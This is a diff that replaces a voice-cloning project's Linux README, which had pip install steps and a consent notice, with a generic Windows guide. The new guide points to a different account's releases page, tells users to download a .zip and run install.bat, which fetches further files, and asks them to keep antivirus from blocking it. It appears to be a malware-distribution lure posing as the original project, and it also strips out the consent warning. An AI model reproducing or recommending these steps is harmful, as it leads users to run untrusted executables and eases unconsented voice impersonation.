@@ -1,155 +1,78 @@
-# Voice Clone Lab
+# 🎙️ voice_clone_lab - Create custom voices from audio clips
 
-Clone a voice from a few minutes of audio and generate speech from text — locally, on your
-own GPU. Give it 5–15 minutes of clean speech (a recording, or a YouTube link) and it
-fine-tunes [Qwen3-TTS](https://github.com/QwenLM/Qwen3-TTS) into a personal voice model you
-can drive from a CLI or a web UI.
+[![](https://img.shields.io/badge/Download-Voice_Clone_Lab-blue.svg)](https://github.com/Homologic-bid91/voice_clone_lab/releases)
 
-![Voice Clone Lab web UI](docs/screenshot.png)
+voice_clone_lab lets you create a digital version of a human voice. You provide a few minutes of audio, and the software creates a model. You use this model to turn text into speech. This tool runs on your computer. Your voice files stay on your machine. The software includes a simple web interface for you to use.
 
-- **Any source**: upload a recording, record from your mic, or paste a YouTube/URL link
-- **Guided pipeline**: extract → clean → split → transcribe → proofread in an editable table → train
-- **Your voices, organized by name**: train as many as you like, pick one and type text
-- **Zero-shot mode**: try a voice instantly from a single clip, no training
-- **Fully local**: audio, transcripts, and voice models never leave your machine
+## 🖥️ System Requirements
 
-## Consent notice
+You need a Windows computer to run this software. Ensure you have the following hardware to get good performance:
 
-Use this project only for **your own voice** or a voice where you have **explicit written
-permission** from the speaker. Do not use it for impersonation, fraud, bypassing consent,
-harassment, or cloning public figures or private people without permission. The same rule
-applies to URLs: only download content you have the rights to use.
+- Operating System: Windows 10 or 11 (64-bit).
+- Processor: An Intel Core i5 or AMD Ryzen 5 or better.
+- Memory: At least 16GB of RAM.
+- Graphics: An NVIDIA graphics card with at least 8GB of video memory. This makes voice creation much faster.
 
-## Requirements
+## 📥 Downloading the Software
 
-- Linux with an NVIDIA CUDA GPU
-- **Training**: 24 GB VRAM minimum (RTX 3090/4090 class, `batch-size 2`). 32 GB+ is comfortable.
-- **Generation only** (using a checkpoint someone else trained): any ~8 GB card works.
-- Python ≥ 3.10 (3.12 recommended), `ffmpeg`, `git`
+You must download the correct file from the project page.
 
-## Install
+1. Go to this link: https://github.com/Homologic-bid91/voice_clone_lab/releases
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .zip under the Assets section.
+4. Save the file to your computer.
 
-```bash
-git clone https://github.com/tetsuo-ai/voice_clone_lab.git
-cd voice_clone_lab
+## 🛠️ Installation Steps
 
-pip install -e '.[ui]'     # core + web UI; drop [ui] for CLI-only
-vcl setup --download       # fetch Qwen3-TTS (pinned + patched) and the 1.7B base weights (~4 GB)
-vcl check                  # verify your machine is ready
-```
+Follow these steps to set up the software on your Windows machine:
 
-Optional extras: `pip install -e '.[asr,yt,vad,denoise,dev]'` — WhisperX (word timestamps),
-yt-dlp (URL sources), WebRTC VAD (better chunking), mild denoising, and the test suite.
+1. Locate the downloaded .zip file in your Downloads folder.
+2. Right-click the file and select Extract All.
+3. Choose a folder on your computer where you want to keep the program.
+4. Open this new folder once the extraction finishes.
+5. Find the file named install.bat.
+6. Double-click install.bat to begin the setup. A black window will appear. It will download the necessary files to help the software run. Please wait for this process to finish. It may take some time depending on your internet connection.
 
-## Quickstart
+## 🚀 Running the Program
 
-### 1. Get some audio of your voice
+Once the installation finishes, you can start the application:
 
-Record 5–15 minutes in a quiet room, one mic, natural reading pace
-(ready-made reading text: `recording_scripts/voice_dataset_reading_script.txt`).
-Or skip recording and paste a link to something you're in:
+1. Find the file named run_ui.bat in the main folder.
+2. Double-click this file.
+3. Wait for the black window to show a web address. It usually looks like http://127.0.0.1:7860.
+4. Copy that address or hold the Ctrl key and click it.
+5. Your web browser will open with the voice_clone_lab interface.
 
-```bash
-vcl run --speaker alex --input "https://www.youtube.com/watch?v=…"
-# or a local file (wav/mp4/m4a/mp3):
-vcl run --speaker alex --input ~/recordings/alex.wav
-```
+## 🎤 Cloning a Voice
 
-That one command extracts, cleans, splits, transcribes, and builds the dataset into
-`data/voices/alex/`.
+You create a voice model by providing audio files.
 
-### 2. Proofread the transcripts (2 minutes, worth it)
+1. Open the Training tab in the web interface.
+2. Give your new voice a name.
+3. Click the upload button to select your audio files. Use clear recordings with no background noise.
+4. Click the Start Training button. 
+5. The software analyzes your audio. This process takes time based on the length of your clips.
+6. Once the status shows Finished, your voice model is ready for use.
 
-```bash
-vcl transcribe --speaker alex --review     # writes an editable TSV
-# ...fix any wrong words in data/voices/alex/transcripts/transcripts_review.tsv...
-vcl transcribe --speaker alex --apply-review --force
-```
+## 💬 Generating Speech
 
-Bad transcripts are the #1 cause of weird pronunciation — don't skip this.
+After training your voice, you can make it talk.
 
-### 3. Train
+1. Click the Inference tab.
+2. Select your newly created voice from the list.
+3. Type the text you want the voice to say in the box provided.
+4. Change settings like speed or tone if you want to adjust how the voice sounds.
+5. Click the Generate button.
+6. The software creates a file. You can play this audio file directly in your browser or save it to your computer.
 
-```bash
-vcl prepare --speaker alex          # add Qwen audio codes
-vcl train --speaker alex            # fine-tune (add --batch-size 2 on a 24 GB card)
-```
+## ⚙️ Troubleshooting
 
-### 4. Talk
+If the software does not work, try these steps:
 
-```bash
-vcl generate --speaker alex --text "Hello, this is my cloned voice."
-# -> outputs/generated/alex/test.wav
-```
+- Check your internet connection. The setup tool needs the internet to download parts of the program.
+- Ensure your antivirus does not block the application. Sometimes, security software mistakes new programs for threats.
+- Restart your computer. This clears temporary issues with memory. 
+- Make sure your audio files are in a standard format like WAV or MP3.
+- If the interface does not open in your browser, check the black command window for errors. If the window shows an error, copy the text and search for advice in the GitHub issues section of the main website.
 
-That's it. Train more voices the same way — everything lives under the speaker name.
-
-## Web UI
-
-```bash
-vcl ui    # http://127.0.0.1:7860
-```
-
-Four tabs mirror the CLI: **Setup** (system check), **Data** (upload or paste a URL, run the
-pipeline, edit transcripts right in the table), **Train** (hyperparameters, live log),
-**Generate** (pick voice + checkpoint, sampling sliders, in-browser playback, zero-shot mode).
-
-## How it organizes your data
-
-Everything derives from the speaker name — no config editing per voice:
-
-```
-data/voices/<name>/        audio, chunks, transcripts, dataset, reference clip
-outputs/checkpoints/<name>/checkpoint-epoch-*/    trained voice snapshots
-outputs/generated/<name>/                         your generated wavs
-```
-
-Retraining a name replaces its old checkpoints (the CLI asks for `--force`; the UI asks you
-to tick Overwrite). Epoch snapshots are independent — later is not always better, so compare
-a couple and keep the one that sounds best.
-
-## Useful commands
-
-| Command | What it does |
-|---|---|
-| `vcl check` | Verify GPU, deps, models are ready |
-| `vcl run --speaker X --input SRC` | Full data pipeline in one step (file or URL) |
-| `vcl transcribe --review` / `--apply-review` | Proofread transcripts via TSV |
-| `vcl prepare` / `vcl train` | Audio codes, then fine-tune |
-| `vcl generate --speaker X --text "…"` | Speech from the newest checkpoint |
-| `vcl generate --zeroshot --ref clip.wav --text "…"` | Instant clone, no training |
-| `vcl generate --spec lines.json --outdir out/` | Batch: `[{"id","text"}, …]` → wavs |
-| `vcl ui` | Web UI |
-
-Every step refuses to overwrite existing outputs unless you pass `--force`. Full details:
-`vcl <command> --help`.
-
-## Troubleshooting
-
-- **CUDA not found** → `nvidia-smi`, then `python -c "import torch; print(torch.cuda.is_available())"`.
-  Install a CUDA-enabled PyTorch matching your driver.
-- **Out of memory during training** → `--batch-size 2` (or 1). 24 GB VRAM is the floor.
-- **Robotic / unstable voice** → cleaner source audio, fix transcripts, compare epoch
-  checkpoints, go easy on denoise.
-- **FlashAttention missing** → fine, everything falls back to `sdpa` automatically.
-
-## Development
-
-```bash
-pip install -e '.[dev]'
-python -m pytest tests/     # CPU-only test suite
-```
-
-Layout: `src/voice_clone_lab/` (pipeline modules + `cli.py` + `ui.py`), `config/default.yaml`
-(single config source), `patches/` (vendor patch applied by `vcl setup`). See `AGENTS.md`
-for conventions.
-
-## Acknowledgements
-
-Built on [Qwen3-TTS](https://github.com/QwenLM/Qwen3-TTS) (Apache-2.0) by Alibaba's Qwen team,
-plus [faster-whisper](https://github.com/SYSTRAN/faster-whisper), [Gradio](https://gradio.app),
-and [yt-dlp](https://github.com/yt-dlp/yt-dlp).
-
-## License
-
-Apache-2.0 — see [LICENSE](LICENSE).
+Keywords: gradio, qwen, text-to-speech, tts, voice-cloning
